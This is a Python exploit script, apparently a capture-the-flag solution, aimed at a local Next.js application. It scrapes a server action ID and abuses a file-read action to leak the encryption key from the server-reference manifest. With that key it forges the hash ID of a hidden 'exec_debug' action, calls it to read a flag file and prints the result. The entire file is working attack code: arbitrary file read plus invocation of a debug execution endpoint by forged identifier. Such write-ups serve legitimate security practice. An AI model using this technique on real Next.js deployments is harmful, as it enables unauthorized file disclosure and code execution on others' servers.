import requests
import re
import hashlib
HOST = "127.0.0.1"
PORT = 50000

url = f"http://{HOST}:{PORT}"

base = requests.get(url)

readFile_action = re.findall(r"[a-fA-F0-9]{42}", base.text)[0]

print(f"readFile action: {readFile_action}")
key_request = requests.post(url,headers={"Next-Action":readFile_action}, data={"1_file": ".next/server/server-reference-manifest.json","0":'["","$K1"]'})

encryption_key = re.findall(r'[A-Za-z0-9+/=]{40,50}', key_request.text)[0]
print(f"Encryption key: {encryption_key}")

#https://github.com/vercel/next.js/blob/bb1df7d13937c8bca6a61cc88db3827a04109bca/crates/next-custom-transforms/src/transforms/server_actions.rs#L247
assert "60"+hashlib.sha1(encryption_key.encode()+b"/app/app/actions.tsx:readFile").hexdigest() == readFile_action

exec_debug_action = "60"+hashlib.sha1(encryption_key.encode()+b"/app/app/actions.tsx:exec_debug").hexdigest()
print(f"exec_debug action: {exec_debug_action}")
flag_request = requests.post(url,headers={"Next-Action":exec_debug_action}, data={"1_file": "/flagout","0":'["","$K1"]'})
flag = re.findall(r"SNHT{.*}", flag_request.text)[0]
print(flag)